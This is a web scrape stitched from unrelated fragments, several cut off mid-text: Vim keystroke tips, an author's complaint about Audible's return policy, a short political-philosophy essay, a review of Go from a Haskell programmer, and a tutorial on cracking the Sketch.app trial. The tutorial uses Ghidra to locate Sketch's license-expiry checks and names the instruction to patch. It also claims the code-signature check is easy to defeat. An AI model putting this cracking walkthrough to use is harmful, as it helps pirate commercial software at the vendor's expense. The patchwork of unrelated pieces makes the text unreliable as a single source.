<p>I’ve learned all kinds of new keystrokes and Vim tips through playing. Predictably, some of them are very niche and forgettable. But, I’ve found others which I didn’t know and now incorporate daily into my Vim usage. I’d imagine reading this, some will be familiar, and some new. This is <em>not</em> meant to be an introduction to Vim. Rather if (like me) you’ve been using Vim for a little bit but haven’t recently looked up Vim commands, I’m hoping some of these will be helpful.</p>

<p>My recommendation in reading through this post is to have a file open in Vim, and try out these commands as you read them. I hope at least a few are helpful for your workflow and make their way into your regular Vim usage!</p>

<h3 id="insertion">Insertion</h3>
<ul>
  <li><code>Ctrl-n</code> in insertion mode inserts based on context. It will prompt a word based on contents of the file. Keep hitting <code>Ctrl-n</code> to get the contextually next word</li>
  <li><code>O</code> moves into insertion mode in a new line above the cursor</li>
  <li><code>ci&lt;char&gt;</code> to delete within the <code>&lt;char&gt;</code> and put you in insertion mode. For example, <code>ci(</code> deletes everything within the <code>(...)</code> and puts you in insertion mode. Also helpful, <code>ci”</code> and <code>ci{</code></li>
  <li><code>S</code> deletes the current line and puts you in insertion mode</li>
  <li><code>.</code> repeats the previous action (specifically helpful for insertion)</li>
  <li><code>Ctrl-o</code> in insertion mode escapes for one command in normal mode. This is <em>very</em> helpful for movement while inserting</li>
  <li><code>I</code> inserts at the beginning of the line</li>
</ul>

<h3 id="movement">Movement</h3>
<ul>
  <li><code>^</code> moves the cursor to the first non-whitespace character on the line</li>
  <li><code>+</code> moves to the beginning of the first word (non-whitespace character) on next line</li>
  <li><code>Ctrl-o</code> (backwards) and <code>Ctrl-i</code> (forwards) together jump the cursor around to where it was previously in any files. Keep using <code>Ctrl-o</code> to go backwards, and <code>Ctrl-i</code> to go forwards. (<code>:help jumplist</code> for more info here)</li>
  <li><code>B</code> (backwards) and <code>E</code> (forwards) move the cursor using only whitespace as delimiters</li>
  <li><code>F&lt;char&gt;</code> (backwards) and <code>f&lt;char&gt;</code> (forwards) find a character or word on the current line</li>
</ul>

<h3 id="copy-paste">Copy Paste</h3>
<ul>
  <li><code>Y</code> highlights the line and copies it (I had been using <code>Vy</code> for this)</li>
  <li><code>"+y</code> copies highlighted words to the clipboard so you can paste the value outside of Vim</li>
  <li><code>"+Y</code> copies the line the cursor is on to the clipboard so you can paste the value outside of Vim</li>
  <li><code>Ctrl-y</code> in insertion mode pastes the contents of the line directly above</li>
</ul>

<p>Tip: If you highlight a word (or lines) and then replace it, the highlighted word moves into the register, and will be the next word you paste</p>

<h3 id="indenting-text">Indenting Text</h3>
<ul>
  <li><code>&lt;&lt;</code> (left) and <code>&gt;&gt;</code> (right) shifts the current line</li>
  <li><code>&lt;iB</code> (left) and <code>&gt;iB</code> (right) shifts the code in the current block</li>
  <li><code>=i{</code> fixes indentation of block excluding the braces</li>
  <li><code>=a{</code> fixes indentation of block including the braces</li>
  <li><code>gg=G</code> to indent the full file</li>
</ul>

<p>Tip: Use <code>gg=G</code> and then <code>Ctrl-o</code> to get the cursor back to where it was</p>

<h4 id="refocusing-the-page">Refocusing the page</h4>
<ul>
  <li><code>zt</code> moves the line the cursor is on to the top of the page</li>
  <li><code>zz</code> moves the line the cursor is on to the middle of the page</li>
  <li><code>zb</code> moves the line the cursor is on to the bottom of the page</li>
</ul>

<h3 id="specific-characters">Specific Characters</h3>
<ul>
  <li><code>~</code> switches the case of a character</li>
  <li><code>Ctrl-a</code> increments numbers</li>
  <li><code>Ctrl-x</code> decrements numbers</li>
</ul>

<p>Tip: The cursor doesn’t need to be on the number itself, it’ll increment or decrement any number after the cursor on the same line</p>

<h3 id="miscellaneous">Miscellaneous</h3>
<ul>
  <li><code>ZZ</code> and <code>:x</code> both only save the file if it has been modified, and then quit</li>
  <li><code>:!&lt;command&gt;</code> to run a bash command from Vim (for example <code>:!ls</code>)</li>
  <li><code>gql</code> will split one line to the currently set width. To set the width of the split lines to be different from your current setting, you can use <code>:set textwidth=&lt;n&gt;</code>. This can be helpful for 80 character linting, for example</li>
  <li><code>dat</code> deletes everything inside an HTML tag including the tag</li>
  <li><code>dit</code> deletes everything inside an HTML tag excluding the tag</li>
</ul>

Grab a coffee or tea or even an alcoholic beverage and let me take you into the <em>Twilight Zone</em> of the audiobook business, where the company who now controls a majority of the publishing industry, the same company who calls themselves the most customer-centric company in the world is fleecing authors blind, emphasis on blind (since they've been hiding it very well for years.)

Your favorite authors, me included, have been used in a program by Amazon called <strong>Audible.</strong> You might have heard of them. They're just a little audiobook company that it seems  may be losing market share, or something has worried them, so they've found a way around the one thing standing between them and mega-profits: </span><strong><span>paying their content providers.</span></strong><span> You know, the little guys who spend months, years even, creating a story, then producing an audiobook to keep their readers happy and hopefully bolster their mostly meagre income in order to feed their family or pay for enough coffee to write their next book.
</span>
</span></p><p id="viewer-704bm"><span><strong><span>Returns have been actively hidden from Rights Holders and we have been robbed in broad daylight (or blank spreadsheet).<!-- --> </span></strong></span></p><p id="viewer-9ndfm"><span><span>Whether you are an author who has audiobooks currently or you are planning audiobooks, or you're a book lover or Audible customer, it's worth your while to read this saga. This is probably the single worst royalties grab by an Amazon company so far, and we need to stand together and stop this urgently. Big and small earning authors and those in-between, along with small publishers (and maybe Big Fives) are losing mega-dollars because of Audible's egregious behavior. Soon book lovers will also lose, because audiobooks will no longer be released from their beloved authors, me being one. It's just not financially worth it, plus who wants their stuff stolen when you've taken so much care to make it so nice.</span></span></p><div id="viewer-5pbpg"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.susanmaywriter.net/single-post/audiblegate-the-incredible-story-of-missing-sales" data-pin-media="https://static.wixstatic.com/media/a4d16d_43db2e505afd472e98cb4e47cf6699f8~mv2.jpg/v1/fit/w_300%2Ch_225%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/a4d16d_43db2e505afd472e98cb4e47cf6699f8~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-ahpnm"><span><span>Audible has their own publishing/distribution company where you can produce your book and then that book is distributed to Audible, Amazon and Apple. If you choose  to <em>"go exclusive" </em>and distribute only to these three, you are granted the princely profit split of 40%. This is after spending sometimes upward of $6 to $8k on an audiobook. To give you an idea, my last audiobook </span><a href="http://readerlinks.com/l/779139/ddz" target="_blank" rel="noopener"><u><span>Destination Dark Zone</span></u></a><span> cost me $US6,200 to produce. 

If you're not exclusive to Audible and decide to distribute your book to other retail stores such as Kobo, Scrib'd and local libraries, then you only receive twenty-five percent of your sales or your share of the pot from memberships. 

Oh, that's right I didn't mention that. There's three ways an author is paid. When an Audible member uses a monthly credit that they receive as part of their membership, a rights holder receives a share of the pot created by the number of memberships paid, minus Audible's profit. This pot varies each month. So we never know how much this per download share will be until the day we are paid, but it's something close to $US5, while members pay $14.95 for a membership and one credit per month to use on a book. 

When you pay, say, $7.49 on Amazon for an add-on audiobook when you've purchased the eBook, we are paid $2.99 on the forty percent split. Should you buy an audiobook as a member from Audible and not use a credit, according to my reports, members pay $9.15 for most of my books, and I receive $3.61.  

Some rights holders don't have an exclusive deal with Audible. Many don't because they believe in not putting all their eggs in Amazon's basket. Well, they get less. So, just go right ahead and nearly halve these payments because they only receive twenty-five percent. It's not much is it compared to what readers and members pay for each book or monthly subscription fee?</span></span></p><p id="viewer-7l2n4"><span><span>Here's a crash course. You don't just record it and release like it's magic. You have to search for the perfect narrator and that sure takes some time. Then brief them, swapping emails until you're positive they're a good fit for you and your work. There's plenty of to-ing and fro-ing between you, as you nail the characters' voices and polish them to your liking before the narrator starts the narration. </span></span></p><p id="viewer-8b75k"><span><span>This involves them sending you a fifteen minute file, you listen and send them feedback until you're both happy. There's studios hired sometimes, and the narrator's fee is dependent upon their experience and quality of work. Mine have all won awards and they don't come cheap, but they're brilliant professionals so I don't begrudge their charges. After the recording, which can take a week or more, we have proofing and engineering to ensure the whole book's sound is consistent and intakes of breath and random clicks are banished.

For every hour to which you listen, it takes two to four to produce, and that's just the narrator's time. In my case, I listen through the finished audio files, and even with paying for proofing still a few mistakes slip through. So back it goes for the narrator to drop in the corrections (which takes a bit of time for the narrator, and if it's my mistake with a typo I pay extra) until it's right. You won't believe how tough it is to listen to your own book and think, G<em>ee, I could have written that sentence better, </em>or<em> hear</em> an actual typo or the same word used too many times in one paragraph.

Then, finally, yay, your audiobook is done and you pay the narrator or, in some cases, independent authors who can't afford to pay up front enter a royalty share deal and split the future income with the narrator for seven years. So, in this case, the narrator works for nothing, zip, nada, and hopes to eventually, somewhere down the track, recover their costs and actually get paid so they can buy mouth gargle and honey to keep their voices healthy and, well, eat. It's pretty tough for some if they pick the wrong book to narrate which doesn't sell and never pays out. They've worked for nothing.

The excited author then excitedly hits publish and waits for their book to go through Quality Assurance at ACX. Keep in mind, they've already paid and probably aren't rich, so they need that book out there selling to get their money back because, well, eating is kind of addictive, and life without hot water is pretty miserable. 

For the past twelve months though some authors and narrators have been waiting months to have their books approved. This is while business is booming at Audible apparently but they don't have enough staff to keep everything running smoothly. It's November 2020 now, and I've seen comments that there are some audiobooks from March, and even January, still caught up in the quality assurance system. And these kind of delays started well before COVID hit. </span></span></p><p id="viewer-29dq1"><span><span>I'd like to pause at this moment to ask where the Quality Assurance Department is for their Quality Assurance Department? <strong>"We seem to have a problem here, Captain Kirk." Where's Scotty from engineering when you need him?</strong></span></span></p><div id="viewer-22g3t"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.susanmaywriter.net/single-post/audiblegate-the-incredible-story-of-missing-sales" data-pin-media="https://static.wixstatic.com/media/a27d24_8c5fc0fe012748d4bfca3f53157e5543~mv2.jpg/v1/fit/w_686%2Ch_427%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/a27d24_8c5fc0fe012748d4bfca3f53157e5543~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-a29fi"><span><span>So, this whole system seems a little unfair, right?

This is the prologue, the background, so you're informed and will realize how dire what I'm about to share with you is for your favorite authors and why I've spent the past month not writing but trying to fight for an injustice to be rectified.

Even more insidious than the low royalty rates paid us by Audible is something I call </span><a href="https://www.susanmaywriter.net/susan-may-1/search/.hash.audiblegate" target="_self"><span>#AudibleGate</span></a><span>, of which you may not be aware. </span><strong><span>Audible is promoting returns of any audible book for "any reason, no questions asked," even if the person has listened to the whole Audible book and enjoyed it. </span></strong><span>The return is permissible up to 365 days and in some countries it's been reported that it's infinity.
<strong>
What??? </strong>

Hey now, no, Susan May, how would that work? Surely not. That would be objectively unfair to the author. Might even be illegal. </span></span></p><p id="viewer-dv8ci"><span><span>Why, yes, it is unfair and morally wrong and possibly even theft by stealth. You're so smart to realize that. Do tell Audible because they don't seem to get it.</span></span></p><p id="viewer-biqke"><span><span>Audible are actively promoting this <strong>"benefit" </strong>to their members as a way of incentivizing them to stay locked in each month because you can only return audiobooks if you're a member. Hmm, that's clever marketing. 

Audible even sends emails encouraging users to return a book, screens pop up after you finish reading suggesting a <strong><em>return</em>,</strong> and there is even </span><strong><span>an obvious "return" button on the app</span></strong><span> which changes wording depending on whether you've finished the book or are part way through. Part-finished it's <strong>"RETURN TITLE". </strong>Finish the book and it changes to <strong>"EXCHANGE."</strong></span></span></p><div id="viewer-2g9mf"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.susanmaywriter.net/single-post/audiblegate-the-incredible-story-of-missing-sales" data-pin-media="https://static.wixstatic.com/media/a27d24_0f8ceafa1fa8416db60f7f02e1e54af1~mv2.jpg/v1/fit/w_1000%2Ch_886%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/a27d24_0f8ceafa1fa8416db60f7f02e1e54af1~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-ck9g7"><span><span><em>Who loses when I return a book? </em>readers think.</span></span></p><p id="viewer-9ukgr"><span><span>Audible!

<blockquote>
<p>The idea that <em>everyone</em> should participate in the concerns of the state entails the further assumption that <em>everyone is an expert on such matters</em>; this is also absurd, notwithstanding the frequency with which we hear it asserted.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
</blockquote>
<p>Do we have any notion of this absurdity at all today? Or is it the case that the absurdity of electoral democracy has been sublimated into the absurdity of the candidates themselves? As if the impossible Trump-Biden decision were merely the aberration of an otherwise smoothly functioning political system?</p>
<p>Yet everyone today knows the truth:<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a> the absurdity of this election is a manifestation of the contradiction inherent to a state in which universal suffrage coexists with the devaluation of logical thought (λόγος).</p>
<p>The Hegelian solution<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> to this problem is appropriately double:</p>
<ol type="1">
<li>We must give the voting population (the <em>demos</em>, the δῆμος) knowledge of λόγος,</li>
<li>And we must allow suffrage only to those who possess this knowledge.</li>
</ol>
<p>The latter side of this decision, taken in isolation, indeed necessitates the possibility of despotism. But Hegel’s point is precisely that <em>the possibility of despotism is a necessary moment of liberation</em>.</p>
<p>In other words, the exclusion of despotism <em>qua possibility</em> also leads to despotism. (And isn’t this the conundrum in which we find ourselves today? That the tyranny of the majority is increasingly more threatening than the tyranny of the <em>idiōtēs</em> [ἰδιώτης], the tyranny of the individual, of the idiot?)</p>
<p>In genuine Aristotelian fashion we must consider the <em>balance</em> of the rule of the people (democracy) with the rule of the individual (monarchy)—even if the <em>telos</em> of the individual is only the education of the <em>demos</em>. Only in this way is it possible to protect the idea of freedom from the double threat of the tyranny of the majority combined with the tyranny of the idiot.</p>
<section id="update-november-4th">
<h3>Update November 4<sup>th</sup>:</h3>
<p>When will people learn that a fifty-fifty split is the expected outcome of the two-party system? When will they wake up to the fact that enantiodromia (ἐναντιοδρομία) is the law of the land, and that each party contains the other party within itself?</p>
<p>Just as a monarch may be an idiot or a sage, so can the <em>demos</em>. It is really only a matter of whether the people care to educate themselves; that is, whether they wish to engage in the kind of deliberation that invariably leads to the thought that everything contains its own opposite (ἐναντίον).</p>

<section itemprop="articleBody">
<p>This summer I’ve been interning at <a href="https://pusher.com/">Pusher</a>, and have been writing a lot of Go. It’s been a bit of a change coming from a Haskell background, so I decided to write up my thoughts now, at the end.</p>
<h2 id="the-good">The Good</h2>
<h3 id="incredibly-easy-to-pick-up">Incredibly easy to pick up</h3>
<p>There’s not a lot to Go, it’s quite a small language. I had never written a line of it before June, and now I’ve written about 30,000. It’s very easy to get started and become productive.</p>
<p>Haskell, on the other hand, is notorious for being hard to learn (<em>cough</em> monad tutorials <em>cough</em>). People often find it really hard to take the step from evaluating pure mathematical expressions to writing actual programs. I experienced no such disconnect in Go.</p>
<h3 id="garbage-collector-keeps-getting-better-and-better">Garbage collector keeps getting better and better</h3>
<p>Pusher previously tried to use Haskell for the project I was working on, but eventually had to give up due to unpredictable latency caused by garbage collection pauses. GHC’s garbage collector is <a href="https://blog.pusher.com/latency-working-set-ghc-gc-pick-two/">designed for throughput, not latency</a>. It is a generational copying collector, which means that pause times are proportional to the amount of live data in the heap. To make matters worse, it’s also stop-the-world.</p>
<p><a href="https://blog.golang.org/go15gc">Go’s garbage collector</a> is a concurrent mark-sweep with very short stop-the-world pauses, and it just seems to <a href="https://golang.org/doc/go1.7#performance">keep getting better</a>. This is definitely a good thing for a garbage collected language. We did have some issues with unacceptable latencies, but were able to work them all out. No such luck with the Haskell project.</p>
<h3 id="style-wars-are-a-thing-of-the-past">Style wars are a thing of the past</h3>
<p>Say what you like about <code>gofmt</code>, but it makes arguments over code style almost impossible. Just run it on save, and your code will always be consistently formatted.</p>
<p>I do find it a little strange that <code>gofmt</code> has been completely accepted, whereas Python’s significant whitespace (which is there for exactly the same reason: enforcing readable code) has been much more contentious across the programming community.</p>
<h2 id="the-neutral">The Neutral</h2>
<h3 id="code-generation-seems-to-be-the-accepted-solution-to-a-lot-of-problems">Code generation seems to be the accepted solution to a lot of problems</h3>
<p>I am not a huge fan of code generation (and I say this as <a href="https://blog.pusher.com/go-interface-fuzzer/">the author of a code generation tool</a>). I think it can do good, but it can also obscure what’s actually going on. In every discussion on Go generics, someone will come along and say you can add generics with code generation: that’s true, but at the cost of introducing additional, nonstandard, syntax.</p>
<p>I suspect the strong culture of code generation is largely because it lets you work around the flaws of the language.</p>
<h3 id="strict-not-lazy-evaluation">Strict, not lazy, evaluation</h3>
<p>Strict evaluation is typically better for performance than lazy evaluation (thunks cause allocation, so you’re gambling that <a href="https://www.barrucadu.co.uk/posts/2016-02-12-strict-vs-lazy.html">the computation saved offsets the memory cost</a>), but it does make things less composable. There have been a couple of times where I’ve gone to split up a function, only to realise that doing so would require allocating a data structure in memory which before was not needed.</p>
<p>I could trust the compiler to inline things for me, and so optimise away the additional allocations, but in a lazy language you just don’t have that issue at all.</p>
<h3 id="the-standard-library-is-not-so-great">The standard library is not so great</h3>
<p>If you know me in person, it might seem a little odd that I specifically comment on this. Normally I am all for languages having a small, really well-written, stdlib and everything else provided through libraries. I am picking on Go here a bit because the standard library seems to get a lot of praise, but I was unimpressed.</p>
<p>Parts of it are good, a lot of it is mediocre, and some of it is downright bad (like the <a href="https://golang.org/pkg/go/ast/">go/ast</a> package documentation). It seems a lot of Go’s use is in webdev, so perhaps those bits of the stdlib (which I haven’t touched at all) are consistently good.</p>
<h2 id="the-bad">The Bad</h2>
<p>I also agree with this Quora answer by Tikhon Jelvis to <a href="https://www.quora.com/Do-you-feel-that-golang-is-ugly">do you feel that golang is ugly?</a>, so have a look at that once you’ve read this section.</p>
<h3 id="a-culture-of-backwards-compatibility-at-all-costs">A culture of “backwards compatibility at all costs”</h3>
<p>In Go, you import packages by URL. If the URL points to, say, GitHub, then <code>go get</code> downloads HEAD of master and uses that. There is no way to specify a version, unless you have separate URLs for each version of your library.</p>
<p>This is just insane.</p>
<p>Go has a very strong culture of backwards compatibility, which I think is largely due to this. Even if you have a flaw in the API of your library, you can’t actually <em>fix</em> it because that would break all of your reverse-dependencies, unless they do vendoring, or pin to a specific commit.</p>
<p>Coming from the Haskell world, where the attitude is far more towards correctness than compatibility, this was probably the biggest culture shock for me. Things break backwards compatibility in Haskell, and the users just update their code because they <em>know</em> the library author did it for a reason. In Go, it just doesn’t happen <em>at all</em>.</p>
<h3 id="the-type-system-is-really-weak">The type system is really weak</h3>
<p>A common mantra in Haskell is “make illegal states unrepresentable,” which is great. If you’ve never come across it before it means to <em>choose your types such that an illegal value is a static error</em>. Want to avoid nulls? Use an option type. Want to ensure a list has at least one element? Use a nonempty list type. Use proper enums, not just ints. etc etc</p>
<p>In Go you just can’t do that, the type system isn’t strong enough. So a lot of things which are (or can be) a <em>compile-time</em> error in Haskell are a <em>runtime</em> error in Go, which is just worse.</p>
<p>Let’s pick on some specifics:</p>
<ul>
<li><p><strong>No generics</strong></p>
<p>Want to write a tree where every element is statically <em>guaranteed</em> to be the same type? Well, have fun implementing a “uinttree”, an “inttree”, a “stringtree”, and so on. You can’t just implement a generic tree.</p>
<p>But Go <em>does</em> have generics, for the built-in types. Arrays, channels, maps, and slices all have generic type parameters. So it seems that the Go developers want generics, but they don’t want to bother implementing it properly, so it remains a special case for a few things in the compiler.</p></li>
<li><p><strong>No sum types</strong></p>
<p>The way in Go to handle possibly-failing functions is to have multiple return values: an actual result, and an error. If the error is <code>nil</code>, then the actual result is sensible; otherwise the actual result is meaningless.</p>
<p>This means you can forget to check the error and use a bogus result and, because there are no compiler warnings (another wtf), you will know nothing of this until things fail at runtime.</p>
<p>With a sum type, like <code>Either error result</code>, that just can’t happen.</p></li>
<li><p><strong>No separation of pure code from effectful code</strong></p>
<p>It is very nice to know, just by looking at the type of a function, that it <em>cannot</em> perform any side-effects. Go’s type system doesn’t do that.</p></li>
</ul>
<h3 id="the-tooling-is-bad">The tooling is bad</h3>
<p>Haskell gets a lot of criticism for bad tooling, but I think it’s worlds ahead of Go in some cases.</p>
<ul>
<li><p><strong>Godoc makes it really difficult to write good documentation</strong></p>
<p>Godoc groups bindings by type, and then sorts alphabetically. Code is not written like that, code is written with related functions in proximity to each other. The source order is <em>almost always</em> better than how godoc sorts things.</p>
<p>Also, <a href="https://github.com/golang/go/issues/7873">godoc doesn’t even support lists</a>:</p>
<blockquote>
<p>Previous proposals similar to this have been rejected on grounds that it’s a slippery slope from this to Markdown or worse.</p>
</blockquote>
<p>I think that comment is particularly discouraging. Because the developers don’t like Markdown (and similar languages), they refuse to add even the most basic of formatting to godoc.</p></li>
<li><p><strong>There is nothing like GHC’s heap profiling</strong></p>
<p>Go has a snapshot-based memory profiler. You can take a snapshot at a point in time, and see which functions and types are taking up the heap space. However, there is <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/profiling.html#profiling-memory-usage">nothing like this</a>.</p>
<p>Being able to see not only a snapshot, but also how things have changed over time, is incredibly useful for spotting memory leaks. If all you have is a snapshot, all you can really say is “well, the number of allocated <code>Foo</code>s looks a bit high, is that right?” With a graph you can say “the number of allocated <code>Foo</code>s is increasing when it shouldn’t be.”</p></li>
<li><p><strong>There is (was?) nothing like ThreadScope</strong></p>
<p><a href="https://wiki.haskell.org/ThreadScope">ThreadScope</a> is a tool for profiling performance of concurrent Haskell programs. It shows which Haskell threads are running on which OS threads, when garbage collection happens, and a bunch of other information.</p>
<p>If things are slower than expected, it’s great: you can see <em>exactly</em> how things are executing. Go doesn’t <em>currently</em> have anything like it, although towards the end of Dave Cheney’s <strong>Seven ways to profile Go applications</strong> talk at <a href="http://golanguk.com/">GolangUK</a>, he did whip out something which looked rather like ThreadScope (sadly, a video isn’t up at the time of writing, that I can see).</p></li>
</ul>
<h3 id="zero-values-are-almost-never-what-you-want">Zero values are almost never what you want</h3>
<p>Go avoids the issue of uninitialised memory by having “zero values”. If you declare a variable of type <code>int</code>, but don’t give it a value, it gets the value 0. Simple.</p>
<p>Except that that’s almost never what you want.</p>
<p>What is a sensible default value for a type? Well, it depends on what you’re using it for! Sometimes there isn’t a sensible default, and not initialising a value should be an error. You can’t define a zero value for your own types, so you’re kind of stuck.</p>
<p>Zero values caused so many problems over the summer, because everything would <em>appear</em> to be fine, then it suddenly breaks because the zero value wasn’t sensible for its context of use. Perhaps it’s an unrelated change that causes things to break (like a struct getting an extra field).</p>
<p>I would much rather:</p>
<ol type="1">
<li>Drop the syntax for declaring a variable without giving it a value.</li>
<li>Make it an error to not initialise a struct field.</li>
</ol>
<h3 id="lots-of-boilerplate">Lots of boilerplate</h3>
<p>The cause of the lots of code generation, I feel.</p>
<ul>
<li><p>Because you have to check error values, if you want to perform a sequence of possibly-erroring computations, where the successful result of one feeds into the next, there is a lot of typing. In Haskell, you’d just use the <code>Either</code> monad.</p></li>
<li><p>If you want to sort a slice, because there are no generics, you need to wrap the slice in another type and implement three methods on that type. So that’s four lines of code to sort a slice of uints, four lines to sort a slice of uint8s, …</p></li></ul></section></article></div></div>

      <hr><h2 id="intro"><a href="#intro"></a>Intro</h2>
<p>It is a wonderful day. A Valentine to precise (14/02/2020). I've spent most of the day with my waifu, enjoying little bit of snow and a cup of coffee. Exchanging each other our gifts (just like in the days we were younger). Therefore, this post is also contribution to her.</p>
<blockquote>
<p>Dedicated to my wife, Ara.</p>
</blockquote>
<p>Inhere, I will show you how easily is to bypass a SketchApp Trial, using nothing more but a Ghidra SRE [1], and a little bit of thinkering. I'm writing this for educational purpose only, but we all have to admit <strong>Sketch.app</strong> is a bit <em>too expensive</em>.  The version I'm working on is <code>Sketch v63.1</code> (latest update).</p>
<h2 id="warming-up"><a href="#warming-up"></a>Warming up</h2>
<p>I highly advice you to create a backup of your Sketch.app (later refered only as <code>Sketch</code>) executable. The usual location for this executable is in <code>/Applications/Sketch.app/Contents/MacOS</code>. The only thing you have to do is copy <code>Sketch</code> in the same directory with a different name.</p>
<p><img src="https://duraki.github.io/images/posts/sketch-how-to-copy.png" alt="Its always good to backup"></p>
<p>Open up Ghidra and create a new project importing Sketch executable from above views. To import, just drag your executable to project view in Ghidra. Refer to Ghidra docs or this [2] phenomenal video by <a href="https://twitter.com/ghidraninja">Ghidra Ninja</a> to learn more about Ghidra basics. This will ease up your reverse engineering if you need to stop and continue to work later on. Now double click on the <code>Sketch</code> from Ghidra project three and let Ghidra analyze the project in full (may take a couple of minutes).</p>
<p><img src="https://duraki.github.io/images/posts/ghidra-sketch-project.png" alt="Sketch.App in Ghidra"></p>
<h2 id="finding-the-trial-implementation"><a href="#finding-the-trial-implementation"></a>Finding the Trial implementation</h2>
<p>There are different ways to find where the trial implementation takes a place. The first and foremost is using XREF string <code>trial days remaining</code> which is shown while starting up the Sketch. The other way is searching for string <code>BCLicenseManager</code> in <code>Symbol Tree</code> window. Since the above string is directly referencing to method <code>numberOfDaysLeftInTrialMode</code>, we can also search for that string excatly in the same window. </p>
<p><img src="https://duraki.github.io/images/posts/ghidra-search-string.png" alt="Method search in Ghidra Project Tree"></p>
<p>When we point Ghidra to this function, we can see the next pseudo-code; which accepts two parameters. The interesting parameter is <code>param_1</code>. The strict business of this parameter is to refer which kind of license is in use. Two options are available in Sketch, if you follow the references: <code>BCRegularLicense</code>, and <code>BCCloudLicense</code>. One is used for offline activation, and the other is used for cloud-based activation. So this <code>BCLicenseManager</code> class has license selector, that returns some license instance.</p>
<pre><code>long_long numberOfDaysLeftInTrialMode(ID param_1,SEL param_2)
{
  ...

  puVar1 = _objc_msgSendSuper2
  uVar3 = (*(code *)_objc_msgSendSuper2)(param_1,<span>"license"</span>)
  uVar3 = _objc_retainBlock(uVar3)
  (*(code *)puVar1)(uVar3,<span>"remainingTimeInterval"</span>)
  uVar4 = (*(code *)puVar1)(&amp;_OBJC_CLASS___NSDate,<span>"dateWithTimeIntervalSinceNow:"</span>)
  uVar4 = _objc_retainBlock(uVar4)
  (*(code *)_objc_retain)(uVar3)
  uVar3 = (*(code *)puVar1)(&amp;_OBJC_CLASS___NSCalendar,<span>"currentCalendar"</span>)
  uVar3 = _objc_retainBlock(uVar3)
  uVar5 = (*(code *)puVar1)(&amp;_OBJC_CLASS___NSDate,<span>"date"</span>)
  uVar5 = _objc_retainBlock(uVar5)
  uVar6 = (*(code *)puVar1)(uVar3,<span>"components:fromDate:toDate:options:"</span>,<span>0x10</span>,uVar5,uVar4,<span>0</span>)
  uVar6 = _objc_retainBlock(uVar6)
  puVar2 = _objc_retain
  (*(code *)_objc_retain)(uVar5)
  (*(code *)puVar2)(uVar3)
  lVar7 = (*(code *)puVar1)(uVar6,<span>"day"</span>)
  (*(code *)puVar2)(uVar6)
  (*(code *)puVar2)(uVar4)
  return lVar7
}</code></pre><p>Next, we have a call to function <code>remainingTimeInterval</code>, and later on, a calculation used for using remaining time through <code>currentCalendar</code> and <code>dateWithTimeIntervalSinceNow</code>. If we search for method called first (<code>remainingTimeInterval</code>), we can see we were pretty right about two possible license classes references through <code>BCLicenseManager</code>.</p>
<p><img src="https://duraki.github.io/images/posts/ghidra-search-remainingTimeInterval.png" alt="remainingTimeInterval visible in two classes"></p>
<p>We will work with-in <code>BCRegularLicense</code> since we don't need to deal with cloud protection and adding stuff to <code>/etc/hosts</code>. Lets see what is inside. We have some interesting functions in there called through in: <code>validityInterval</code>, which basically works with <code>endTime</code> (when license should expire) and combination of <code>networkTime/currentTime</code>. We also have <code>isValid</code> method notifying impl. if license is still available for use.</p>
<pre><code>double remainingTimeInterval(ID param_1,SEL param_2)
{
  ...
  puVar2 = _objc_msgSendSuper2
  uVar1 = (*(code *)_objc_msgSendSuper2)(param_1,<span>"validityInterval"</span>)
  uVar4 = _objc_retainBlock(uVar1)
  uVar1 = (*(code *)puVar2)(uVar4,<span>"endDate"</span>)
  uVar1 = _objc_retainBlock(uVar1)
  uVar6 = (*(code *)puVar2)(param_1,<span>"networkTime"</span>)
  uVar5 = _objc_retainBlock(uVar6)
  uVar6 = (*(code *)puVar2)(uVar5,<span>"currentDate"</span>)
  uVar6 = _objc_retainBlock(uVar6)
  (*(code *)puVar2)(uVar1,<span>"timeIntervalSinceDate:"</span>,uVar6)
  puVar2 = _objc_retain
  (*(code *)_objc_retain)(uVar6)
  (*(code *)puVar2)(uVar5)
  (*(code *)puVar2)(uVar1)
  (*(code *)puVar2)(uVar4)
  cVar3 = (*(code *)_objc_msgSendSuper2)(param_1,<span>"isValid"</span>)
  auVar7 = ZEXT816(<span>0</span>)
  if (cVar3 != <span>'\0'</span>) {
    auVar7 = ZEXT816(<span>extraout_XMM0_Qa);
</span>  }
  auVar7 = maxsd(auVar7,ZEXT816(<span>0</span>))
  return <span>SUB168(auVar7,0);
</span>}</code></pre><p>Lets see what other methods are available in this class named <code>BCRegularLicense</code>. First, filter the Symbol Tree window to reflect the name and once found, scroll to <code>method_list_t</code> where you will right click on it and use Show Reference To.</p>
<p><img src="https://duraki.github.io/images/posts/ghidra-lm-methodlist.png" alt="List Method for Class"></p>
<p>If you scroll down a bit in a Assembly View window, you will find <code>isExpired</code> listed. Lets see what is inside.</p>
<p><img src="https://duraki.github.io/images/posts/isExpired-method.png" alt="isExpired Method in BCRegularLicense"></p>
<pre><code>char isExpired(ID param_1,SEL param_2)

}</code></pre><p>We basically have a simple method to check if the trial is expired or not. </p>
<h2 id="pathching-it-up"><a href="#pathching-it-up"></a>Pathching it up</h2>
<p>If we follow the about <code>bVar6</code>, it can be either <code>true</code> for expired license, or <code>false</code> for unexpired license. Go to this method in Ghidra Listing (Dissasemble) and find a ASM function which moves value of <code>0x1</code> (true) to R12B (<code>bVar6</code>), at address <code>0x1004a2a50</code>.</p>
<pre><code>...

<p>We are not yet done. The Sketch tries to be smart on us; it checks code signature, meaning if the code signature is not valid, it will exit upon running. Since we patched the binary, the signature of the app will be invalid. But similary to other anti-crack techniques, this one is easy to tackle down. </p>
